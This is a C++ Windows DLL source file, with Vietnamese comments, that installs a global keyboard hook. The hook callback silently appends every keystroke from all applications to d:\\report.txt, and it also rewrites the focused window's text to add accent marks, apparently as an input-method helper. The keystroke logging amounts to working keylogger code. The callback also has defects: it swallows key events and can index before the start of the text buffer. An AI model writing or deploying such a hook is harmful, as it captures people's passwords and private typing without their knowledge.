// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

#ifdef _MANAGED
#pragma managed(push, off)
#endif


FILE *f1;
HINSTANCE	 hInstDLL;

#pragma data_seg("SHARED")
HHOOK			hHook;
#pragma data_seg()


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	hInstDLL = (HINSTANCE) hModule;
	return TRUE;
}

LRESULT CALLBACK Xuly(int nCode,   WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0)  // do not process message 
		return CallNextHookEx( hHook, nCode, wParam, lParam );

	char ch;
	if (((DWORD)lParam & 0x40000000) &&(nCode==HC_ACTION))
	{		
		if ((wParam==VK_SPACE)||(wParam==VK_RETURN)||((wParam>0x2f ) && (wParam<=0x100)))
		{
			f1=fopen("d:\\report.txt","a+");
			if (wParam==VK_RETURN)
			{	
				ch='\n';
				fwrite(&ch,1,1,f1);
			}
			else
			{
				BYTE ks[256];
				GetKeyboardState(ks);
				WORD w;
				UINT scan;
				scan=0;
				ToAscii(wParam,scan,ks,&w,0);
				ch = char(w); 
				fwrite(&ch,1,1,f1);	


				HWND hW = GetFocus();
				TCHAR str[1000];
				int len=SendMessage(hW,WM_GETTEXT,1000,(LPARAM)&str);

				if (str[len-1]=='1' )
				{
					if (len>=2)
					{

						if (str[len-2]=='a')
						{													
							str[len-2]=0xE1;							
						}
						if (str[len-2]=='e')
						{													
							str[len-2]=0xE9;							
						}
						if (str[len-2]=='i')
						{													
							str[len-2]=0xED;							
						}
						if (str[len-2]=='o')
						{													
							str[len-2]=0xF3;								
						}
						str[len-1]=0;	
						SendMessage(hW,WM_SETTEXT,0,(LPARAM)str);
					}

				}
			}		
			fclose(f1);
		}
	}	
	return 1;//CallNextHookEx( hHook, nCode, wParam, lParam );//Goi Hook procedure ke tiep trong Hook Chain	

}
// Install hook
__declspec(dllexport) void doSetGlobalHook(HWND hWnd)
{
	// Init value for MappedData	
	hHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)Xuly, hInstDLL, 0);	

}
// Remove hook
__declspec(dllexport) void doRemoveGlobalHook(HWND hWnd)
{
	UnhookWindowsHookEx(hHook);
}
#ifdef _MANAGED
#pragma managed(pop)
#endif

